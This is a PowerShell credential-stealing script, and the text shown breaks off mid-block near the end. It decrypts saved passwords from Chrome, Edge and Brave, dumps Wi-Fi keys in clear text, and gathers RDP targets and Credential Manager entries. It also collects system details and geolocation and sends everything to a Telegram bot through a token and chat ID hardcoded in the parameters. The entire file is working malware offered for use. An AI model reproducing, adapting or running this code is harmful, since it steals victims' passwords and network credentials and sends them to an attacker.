# USE THE BELOW COMMAND TO BYPASS SSL VALIDATION ERROR
# [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Enhanced Multi-Browser and Network Password Extraction with Password Decryption
# Added DPAPI and AES-GCM decryption for browser passwords

param(
    [string]$x = "8407278774:AAEXe4fMbmghWolLzuWIauW_X9CpKoxX82U",
    [string]$y = "2047893044"  
)

# Add .NET types for DPAPI and AES decryption
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class DPAPIHelper {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }
    
    [DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        ref string ppszDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern void LocalFree(IntPtr hMem);
    
    public static byte[] CryptUnprotectData(byte[] encryptedData) {
        DATA_BLOB dataIn = new DATA_BLOB();
        DATA_BLOB dataOut = new DATA_BLOB();
        
        try {
            dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
            dataIn.cbData = encryptedData.Length;
            
            string description = String.Empty;
            DATA_BLOB entropy = new DATA_BLOB();
            
            if (CryptUnprotectData(ref dataIn, ref description, ref entropy, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut)) {
                byte[] decryptedData = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                LocalFree(dataOut.pbData);
                return decryptedData;
            }
        } finally {
            if (dataIn.pbData != IntPtr.Zero) {
                Marshal.FreeHGlobal(dataIn.pbData);
            }
        }
        return null;
    }
}

public class AESHelper {
    public static byte[] DecryptAESGCM(byte[] key, byte[] encryptedData) {
        try {
            // For v10/v20 encrypted data: [v10/v20][12-byte IV][ciphertext][16-byte tag]
            if (encryptedData.Length < 15) return null;
            
            byte[] iv = new byte[12];
            byte[] ciphertext = new byte[encryptedData.Length - 15 - 16];
            byte[] tag = new byte[16];
            
            Buffer.BlockCopy(encryptedData, 3, iv, 0, 12);
            Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
            Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
            
            using (AesGcm aesGcm = new AesGcm(key)) {
                byte[] plaintext = new byte[ciphertext.Length];
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
                return plaintext;
            }
        } catch {
            return null;
        }
    }
}
"@ -ReferencedAssemblies "System.Security.Cryptography.Algorithms"

# Function to get public IP information
function Get-PublicIPInfo {
    try {
        Write-Host "Getting public IP information..." -ForegroundColor Yellow
        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
        return @{
            PublicIP = $ipInfo.ip
            Country = $ipInfo.country
            Region = $ipInfo.region
            City = $ipInfo.city
            Org = $ipInfo.org
            Loc = $ipInfo.loc
            Timezone = $ipInfo.timezone
        }
    } catch {
        Write-Host "Failed to get public IP information: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            PublicIP = "Unknown"
            Country = "Unknown"
            Region = "Unknown"
            City = "Unknown"
            Org = "Unknown"
            Loc = "Unknown"
            Timezone = "Unknown"
        }
    }
}

# Function to get detailed system information
function Get-DetailedSystemInfo {
    $computerInfo = Get-ComputerInfo
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
    $biosInfo = Get-WmiObject -Class Win32_BIOS
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
    
    return @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSName = $osInfo.Caption
        OSVersion = $osInfo.Version
        OSBuild = $osInfo.BuildNumber
        BIOSSerial = $biosInfo.SerialNumber
        Processor = $processorInfo.Name
        ProcessorCores = $processorInfo.NumberOfCores
        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
    }
}

# Function to extract detailed WiFi information
function Get-DetailedWiFiInfo {
    Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
    
    $wifiProfiles = @()
    $wifiInterfaces = @()
    
    try {
        # Get WiFi interface information
        $interfaceInfo = netsh wlan show interfaces
        $interfaceDetails = @{}
        $currentInterface = ""
        
        foreach ($line in $interfaceInfo) {
            if ($line -match "^\s*Name\s*:\s*(.+)") {
                $currentInterface = $matches[1].Trim()
                $interfaceDetails[$currentInterface] = @{}
            } elseif ($currentInterface -and $line -match "^\s*([^:]+)\s*:\s*(.+)") {
                $key = $matches[1].Trim()
                $value = $matches[2].Trim()
                $interfaceDetails[$currentInterface][$key] = $value
            }
        }
        
        # Get all WiFi profiles
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_.ToString().Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                # Get detailed WiFi profile information
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $profileDetails = @{}
                
                foreach ($line in $profileInfo) {
                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
                        $key = $matches[1].Trim()
                        $value = $matches[2].Trim()
                        $profileDetails[$key] = $value
                    }
                }
                
                $password = $profileDetails["Key Content"]
                $authentication = $profileDetails["Authentication"]
                $encryption = $profileDetails["Cipher"]
                
                $wifiProfiles += @{
                    SSID = $profile
                    Password = if ($password) { $password } else { "No password" }
                    Authentication = $authentication
                    Encryption = $encryption
                    ConnectionMode = $profileDetails["Connection mode"]
                    SSIDName = $profileDetails["SSID name"]
                    NetworkType = $profileDetails["Network type"]
                    RadioType = $profileDetails["Radio type"]
                    VendorExtension = $profileDetails["Vendor extension"]
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            } catch {
                Write-Host "Error processing WiFi profile $profile : $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        # Get current connected WiFi information
        $currentWifi = netsh wlan show interfaces | Where-Object { $_ -match "SSID" } | ForEach-Object {
            if ($_ -match "SSID\s*:\s*(.+)") {
                $matches[1].Trim()
            }
        }
        
        $wifiData = @{
            Profiles = $wifiProfiles
            Interfaces = $interfaceDetails
            CurrentlyConnected = if ($currentWifi) { $currentWifi } else { "Not connected" }
            TotalProfiles = $wifiProfiles.Count
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        
        return $wifiData
        
    } catch {
        Write-Host "Error extracting WiFi information: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            Profiles = @()
            Interfaces = @{}
            CurrentlyConnected = "Error"
            TotalProfiles = 0
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Error = $_.Exception.Message
        }
    }
}

# Function to extract RDP connection information
function Get-RDPConnections {
    Write-Host "Extracting RDP connection information..." -ForegroundColor Yellow
    
    $rdpConnections = @()
    
    try {
        # Get RDP connection files from Documents
        $rdpFiles = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.rdp" -ErrorAction SilentlyContinue
        $rdpFiles += Get-ChildItem -Path "$env:USERPROFILE\Desktop" -Filter "*.rdp" -ErrorAction SilentlyContinue
        
        foreach ($rdpFile in $rdpFiles) {
            try {
                $content = Get-Content $rdpFile.FullName -ErrorAction Stop
                $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
                $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
                
                $rdpConnections += @{
                    FileName = $rdpFile.Name
                    Server = $server.Trim()
                    UsernameHint = $username.Trim()
                    FilePath = $rdpFile.FullName
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            } catch {
                Write-Host "Error reading RDP file $($rdpFile.Name): $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        # Check for saved credentials in Credential Manager
        try {
            $cmdkeyList = cmdkey /list 2>$null
            $currentTarget = ""
            
            foreach ($line in $cmdkeyList) {
                if ($line -match "Target:\s*(.+)") {
                    $currentTarget = $matches[1].Trim()
                } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
                    $type = $matches[1].Trim()
                    
                    # Check if this is an RDP credential
                    if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*") {
                        $rdpConnections += @{
                            FileName = "Credential Manager"
                            Server = $currentTarget -replace "TERMSRV/", ""
                            UsernameHint = "Saved in Credential Manager"
                            Type = $type
                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        }
                    }
                    $currentTarget = ""
                }
            }
        } catch {
            Write-Host "Error checking Credential Manager: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Write-Host "Extracted $($rdpConnections.Count) RDP connections" -ForegroundColor Green
        return $rdpConnections
        
    } catch {
        Write-Host "Error extracting RDP connections: $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

# Function to extract Windows network credentials (RDP, VPN, etc.)
function Get-WindowsNetworkCredentials {
    Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
    
    $networkCredentials = @()
    
    try {
        # Extract saved RDP credentials using cmdkey
        $cmdkeyOutput = cmdkey /list 2>$null
        
        $currentTarget = ""
        foreach ($line in $cmdkeyOutput) {
            if ($line -match "Target:\s*(.+)") {
                $currentTarget = $matches[1].Trim()
            } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
                $type = $matches[1].Trim()
                
                # Only include RDP/network related credentials
                if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*" -or 
                    $currentTarget -like "Domain:target=*" -or $currentTarget -like "LegacyGeneric:target=*") {
                    $networkCredentials += @{
                        Target = $currentTarget
                        Type = $type
                        CredentialType = "RDP/Windows"
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                }
                $currentTarget = ""
            }
        }
        
        # Try to extract from Credential Manager (if available)
        try {
            $credentialFiles = Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\Microsoft\Credentials" -ErrorAction SilentlyContinue
            foreach ($file in $credentialFiles) {
                $networkCredentials += @{
                    Target = $file.Name
                    Type = "Encrypted Credential File"
                    CredentialType = "Windows Vault"
                    FilePath = $file.FullName
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            }
        } catch {
            Write-Host "Could not access Credential Manager files: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        Write-Host "Extracted $($networkCredentials.Count) Windows network credentials" -ForegroundColor Green
        return $networkCredentials
        
    } catch {
        Write-Host "Error extracting Windows network credentials: $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

# Function to send message to Telegram
function Send-TelegramMessage {
    param(
        [string]$Message
    )
    
    try {
        $uri = "https://api.telegram.org/bot$x/sendMessage"
        $body = @{
            chat_id = $y
            text = $Message
            parse_mode = "HTML"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
        
        if ($response.ok) {
            Write-Host "‚úÖ Message sent to Telegram" -ForegroundColor Green
            return $true
        } else {
            Write-Host "‚ùå Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "‚ùå Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to send files to Telegram
function Send-TelegramFile {
    param(
        [string]$FilePath,
        [string]$Caption
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            Write-Host "File not found: $FilePath" -ForegroundColor Red
            return $false
        }
        
        # Wait for file to be fully written
        $maxWaitTime = 30
        $waitTime = 0
        while ($waitTime -lt $maxWaitTime) {
            try {
                $file = Get-Item $FilePath
                $fileSize = $file.Length
                if ($fileSize -gt 0) {
                    break
                }
            } catch {}
            Start-Sleep -Seconds 1
            $waitTime++
        }
        
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $y,
            "--$boundary",
            "Content-Disposition: form-data; name=`"caption`"",
            "",
            $Caption,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileContent,
            "--$boundary--"
        ) -join $LF

        $uri = "https://api.telegram.org/bot$x/sendDocument"
        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        
        if ($response.ok) {
            Write-Host "‚úÖ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
            return $true
        } else {
            Write-Host "‚ùå Telegram API error: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "‚ùå Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to install SQLite3 if needed
function Install-SQLiteIfNeeded {
    try {
        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
        $tempZip = "sqlite-temp.zip"
        
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
        
        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to decrypt browser master key
function Get-DecryptedMasterKey {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName
    )
    
    $localStatePath = Join-Path $BrowserDataPath "Local State"
    
    if (-not (Test-Path $localStatePath)) {
        Write-Host "$BrowserName Local State file not found." -ForegroundColor Yellow
        return $null
    }
    
    try {
        Write-Host "Reading $BrowserName Local State file..." -ForegroundColor Yellow
        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localStateContent.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            Write-Host "No encrypted key found in $BrowserName Local State" -ForegroundColor Yellow
            return $null
        }
        
        # Decode base64 encrypted key
        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
        
        # Remove DPAPI prefix (first 5 bytes: 'DPAPI')
        if ($encryptedKeyBytes.Length -gt 5 -and [System.Text.Encoding]::ASCII.GetString($encryptedKeyBytes[0..4]) -eq "DPAPI") {
            $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length-1)]
        }
        
        # Decrypt using DPAPI
        Write-Host "Decrypting $BrowserName master key using DPAPI..." -ForegroundColor Yellow
        $decryptedKey = [DPAPIHelper]::CryptUnprotectData($encryptedKeyBytes)
        
        if ($decryptedKey) {
            Write-Host "‚úÖ Successfully decrypted $BrowserName master key" -ForegroundColor Green
            return $decryptedKey
        } else {
            Write-Host "‚ùå Failed to decrypt $BrowserName master key" -ForegroundColor Red
            return $null
        }
        
    } catch {
        Write-Host "Error decrypting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to decrypt browser password
function Decrypt-BrowserPassword {
    param(
        [byte[]]$EncryptedPassword,
        [byte[]]$MasterKey
    )
    
    if ($null -eq $EncryptedPassword -or $EncryptedPassword.Length -eq 0) {
        return "[Empty]"
    }
    
    try {
        # Check encryption version
        if ($EncryptedPassword.Length >= 3) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedPassword[0..2])
            
            if ($prefix -eq "v10" -or $prefix -eq "v20") {
                # AES-GCM encryption
                Write-Host "  Decrypting AES-GCM encrypted password..." -ForegroundColor Cyan
                $decrypted = [AESHelper]::DecryptAESGCM($MasterKey, $EncryptedPassword)
                if ($decrypted) {
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    # Remove any padding or extra bytes
                    $password = $password.TrimEnd([char]0)
                    return $password
                }
            } else {
                # DPAPI encryption (older Chrome versions)
                Write-Host "  Decrypting DPAPI encrypted password..." -ForegroundColor Cyan
                $decrypted = [DPAPIHelper]::CryptUnprotectData($EncryptedPassword)
                if ($decrypted) {
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    return $password
                }
            }
        }
    } catch {
        Write-Host "  Decryption error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return "[Decryption Failed]"
}

# Function to extract and decrypt browser passwords
function Get-DecryptedBrowserPasswords {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName
    )
    
    $decryptedPasswords = @()
    
    # Get decrypted master key
    $masterKey = Get-DecryptedMasterKey -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
    if (-not $masterKey) {
        Write-Host "‚ùå Cannot decrypt passwords without master key for $BrowserName" -ForegroundColor Red
        return $decryptedPasswords
    }
    
    # Find login data files
    $loginDataFiles = @()
    
    # Check default profile
    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
    if (Test-Path $defaultLoginData) {
        $loginDataFiles += @{ Path = $defaultLoginData; Profile = "Default" }
    }
    
    # Check other profiles
    $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue
    foreach ($profileDir in $profileDirs) {
        $loginDataPath = Join-Path $profileDir.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $loginDataFiles += @{ Path = $loginDataPath; Profile = $profileDir.Name }
        }
    }
    
    if ($loginDataFiles.Count -eq 0) {
        Write-Host "No login database files found for $BrowserName." -ForegroundColor Yellow
        return $decryptedPasswords
    }
    
    Write-Host "Found $($loginDataFiles.Count) login database(s) for $BrowserName" -ForegroundColor Green
    
    foreach ($loginDataFile in $loginDataFiles) {
        $dbPath = $loginDataFile.Path
        $profileName = $loginDataFile.Profile
        
        Write-Host "  Processing profile: $profileName" -ForegroundColor Cyan
        
        try {
            # Copy the database to avoid locking issues
            $tempDbPath = "temp_${BrowserName}_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
            Copy-Item $dbPath $tempDbPath -Force
            
            # Query the database using SQLite
            if (Test-Path ".\sqlite3.exe") {
                $sqlitePath = ".\sqlite3.exe"
            } else {
                $sqlitePath = "sqlite3"
            }
            
            $tempCsvPath = "temp_${BrowserName}_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
            $query = "SELECT origin_url, username_value, password_value FROM logins;"
            & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
            
            if (Test-Path $tempCsvPath) {
                $logins = Import-Csv $tempCsvPath
                Write-Host "    Found $($logins.Count) login entries" -ForegroundColor Green
                
                $counter = 0
                $successfulDecryptions = 0
                
                foreach ($login in $logins) {
                    $counter++
                    
                    if ($login.password_value -and $login.username_value -and $login.origin_url) {
                        try {
                            # Convert hex string to byte array
                            $hexString = $login.password_value
                            if ($hexString -match "^[0-9A-Fa-f]+$") {
                                $encryptedBytes = [byte[]]::new($hexString.Length / 2)
                                for ($i = 0; $i -lt $hexString.Length; $i += 2) {
                                    $encryptedBytes[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)
                                }
                                
                                # Decrypt the password
                                $decryptedPassword = Decrypt-BrowserPassword -EncryptedPassword $encryptedBytes -MasterKey $masterKey
                                
                                if ($decryptedPassword -ne "[Decryption Failed]" -and $decryptedPassword -ne "[Empty]") {
                                    $successfulDecryptions++
                                    
                                    $decryptedPasswords += @{
                                        Browser = $BrowserName
                                        Profile = $profileName
                                        URL = $login.origin_url
                                        Username = $login.username_value
                                        Password = $decryptedPassword
                                        EncryptionVersion = if ($encryptedBytes.Length -ge 3) { 
                                            [System.Text.Encoding]::ASCII.GetString($encryptedBytes[0..2]) 
                                        } else { "Unknown" }
                                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                                    }
                                    
                                    # Show first few successful decryptions
                                    if ($successfulDecryptions -le 3) {
                                        Write-Host "    ‚úÖ Decrypted: $($login.origin_url) - $($login.username_value)" -ForegroundColor Green
                                    }
                                }
                            }
                        } catch {
                            Write-Host "    ‚ùå Error decrypting entry: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                    
                    # Show progress
                    if ($counter % 20 -eq 0 -and $counter -gt 0) {
                        Write-Host "    Processed $counter entries, $successfulDecryptions decrypted..." -ForegroundColor Cyan
                    }
                }
                
                Write-Host "    Profile $profileName: $successfulDecryptions/$counter passwords successfully decrypted" -ForegroundColor Green
                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
            }
            
            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
            
        } catch {
            Write-Host "    Error processing $BrowserName profile $($profileName): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    return $decryptedPasswords
}

# Main execution
Write-Host "Enhanced Browser and Network Password Extraction with Decryption" -ForegroundColor Green
Write-Host "===============================================================" -ForegroundColor Green

# Get system and location information
$systemInfo = Get-DetailedSystemInfo
$ipInfo = Get-PublicIPInfo
$timestamp = Get-Date -Format "ddMMyyyy"
$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)

# Create file names with the new format
$browserFilePrefix = "Browser_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
$networkFilePrefix = "Network_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"

$BrowserJSONPath = Join-Path $PWD "${browserFilePrefix}.json"
$NetworkJSONPath = Join-Path $PWD "${networkFilePrefix}.json"

Write-Host "Location Info:" -ForegroundColor Yellow
Write-Host "Public IP: $($ipInfo.PublicIP)" -ForegroundColor Cyan
Write-Host "Country: $($ipInfo.Country)" -ForegroundColor Cyan
Write-Host "Region: $($ipInfo.Region)" -ForegroundColor Cyan
Write-Host "City: $($ipInfo.City)" -ForegroundColor Cyan
Write-Host "Files will be saved as:" -ForegroundColor Yellow
Write-Host "Browser JSON: $BrowserJSONPath" -ForegroundColor Yellow
Write-Host "Network JSON: $NetworkJSONPath" -ForegroundColor Yellow
Write-Host "Telegram Chat ID: $y" -ForegroundColor Cyan

# Browser paths configuration
$browsers = @{
    "Chrome" = @{
        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Name = "Google Chrome"
    }
    "Edge" = @{
        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        Name = "Microsoft Edge"
    }
    "Brave" = @{
        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        Name = "Brave Browser"
    }
}

# Send system information to Telegram first
$systemMessage = @"
üñ•Ô∏è <b>System Information</b>
‚Ä¢ <b>Computer:</b> $($systemInfo.ComputerName)
‚Ä¢ <b>User:</b> $($systemInfo.UserName)
‚Ä¢ <b>OS:</b> $($systemInfo.OSName) ($($systemInfo.OSVersion))
‚Ä¢ <b>Processor:</b> $($systemInfo.Processor) ($($systemInfo.ProcessorCores) cores)
‚Ä¢ <b>Memory:</b> $($systemInfo.TotalMemoryGB) GB
‚Ä¢ <b>Manufacturer:</b> $($systemInfo.SystemManufacturer)
‚Ä¢ <b>Model:</b> $($systemInfo.SystemModel)
‚Ä¢ <b>BIOS Serial:</b> $($systemInfo.BIOSSerial)
‚Ä¢ <b>Local IP:</b> $($systemInfo.LocalIP)
‚Ä¢ <b>MAC Address:</b> $($systemInfo.MACAddress)

üåç <b>Location Information</b>
‚Ä¢ <b>Public IP:</b> $($ipInfo.PublicIP)
‚Ä¢ <b>Country:</b> $($ipInfo.Country)
‚Ä¢ <b>Region:</b> $($ipInfo.Region)
‚Ä¢ <b>City:</b> $($ipInfo.City)
‚Ä¢ <b>Organization:</b> $($ipInfo.Org)
‚Ä¢ <b>Coordinates:</b> $($ipInfo.Loc)
‚Ä¢ <b>Timezone:</b> $($ipInfo.Timezone)

‚è∞ <b>Extraction Started:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

Write-Host "Sending system information to Telegram..." -ForegroundColor Yellow
Send-TelegramMessage -Message $systemMessage | Out-Null

# Extract detailed WiFi information
Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
$wifiData = Get-DetailedWiFiInfo

# Extract RDP connections
Write-Host "Extracting RDP connections..." -ForegroundColor Yellow
$rdpConnections = Get-RDPConnections

# Extract Windows network credentials
Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
$networkCredentials = Get-WindowsNetworkCredentials

# Combine all network data
$networkData = @{
    WiFi = $wifiData
    RDPConnections = $rdpConnections
    WindowsCredentials = $networkCredentials
    Metadata = @{
        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        OS = $systemInfo.OSName
        OSVersion = $systemInfo.OSVersion
        User = $systemInfo.UserName
        Machine = $systemInfo.ComputerName
        PublicIP = $ipInfo.PublicIP
        Country = $ipInfo.Country
        Region = $ipInfo.Region
        City = $ipInfo.City
        Org = $ipInfo.Org
        Loc = $ipInfo.Loc
        Timezone = $ipInfo.Timezone
        SystemName = $systemInfo.ComputerName
    }
}

# Export network data to JSON
$networkData | ConvertTo-Json -Depth 10 | Out-File -FilePath $NetworkJSONPath -Encoding UTF8
Write-Host "Network data exported to: $NetworkJSONPath" -ForegroundColor Green

# Install SQLite if needed
if (-not (Test-Path ".\sqlite3.exe")) {
    if (-not (Install-SQLiteIfNeeded)) {
        Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
        exit 1
    }
}

# Extract and decrypt browser passwords
$allDecryptedPasswords = @()

# Process each browser
foreach ($browserKey in $browsers.Keys) {
    $browser = $browsers[$browserKey]
    Write-Host "`nProcessing $($browser.Name)..." -ForegroundColor Yellow
    
    # Extract and decrypt passwords
    $decryptedPasswords = Get-DecryptedBrowserPasswords -BrowserDataPath $browser.Path -BrowserName $browser.Name
    $allDecryptedPasswords += $decryptedPasswords
    
    Write-Host "Finished processing $($browser.Name): $($decryptedPasswords.Count) passwords decrypted" -ForegroundColor Green
}

# Display and export results
if ($allDecryptedPasswords.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
    Write-Host "`nSuccessfully extracted and decrypted data!" -ForegroundColor Green
    
    if ($allDecryptedPasswords.Count -gt 0) {
        Write-Host "Decrypted browser passwords: $($allDecryptedPasswords.Count) entries" -ForegroundColor Green
        
        # Show sample of decrypted passwords
        Write-Host "`nSample of decrypted passwords:" -ForegroundColor Yellow
        for ($i = 0; $i -lt [Math]::Min($allDecryptedPasswords.Count, 5); $i++) {
            $pwd = $allDecryptedPasswords[$i]
            Write-Host "  $($i+1). $($pwd.URL)" -ForegroundColor White
            Write-Host "      Username: $($pwd.Username)" -ForegroundColor Gray
            Write-Host "      Password: $($pwd.Password)" -ForegroundColor Green
            Write-Host ""
        }
        
        # Export decrypted data to JSON
        try {
            $exportData = @{
                Metadata = @{
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    TotalDecryptedPasswords = $allDecryptedPasswords.Count
                    OS = $systemInfo.OSName
                    OSVersion = $systemInfo.OSVersion
                    User = $systemInfo.UserName
                    Machine = $systemInfo.ComputerName
                    PublicIP = $ipInfo.PublicIP
                    Country = $ipInfo.Country
                    Region = $ipInfo.Region
                    City = $ipInfo.City
                    Org = $ipInfo.Org
                    Loc = $ipInfo.Loc
                    Timezone = $ipInfo.Timezone
                    SystemName = $systemInfo.ComputerName
                }
                DecryptedPasswords = $allDecryptedPasswords
            }
            
            $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $BrowserJSONPath -Encoding UTF8
            Write-Host "Decrypted browser data exported to: $BrowserJSONPath" -ForegroundColor Green
            
        } catch {
            Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    if ($wifiData.Profiles.Count -gt 0) {
        Write-Host "WiFi passwords: $($wifiData.Profiles.Count) networks found" -ForegroundColor Green
    }
    
    if ($networkCredentials.Count -gt 0) {
        Write-Host "Windows network credentials: $($networkCredentials.Count) entries found" -ForegroundColor Green
    }
    
    if ($rdpConnections.Count -gt 0) {
        Write-Host "RDP connections: $($rdpConnections.Count) entries found" -ForegroundColor Green
    }
    
    # Wait to ensure files are fully written
    Write-Host "Waiting for files to be fully written..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    
    # Send files to Telegram
    Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
    
    $filesSent = 0
    $totalFiles = 0
    
    if ($allDecryptedPasswords.Count -gt 0) {
        $totalFiles += 1
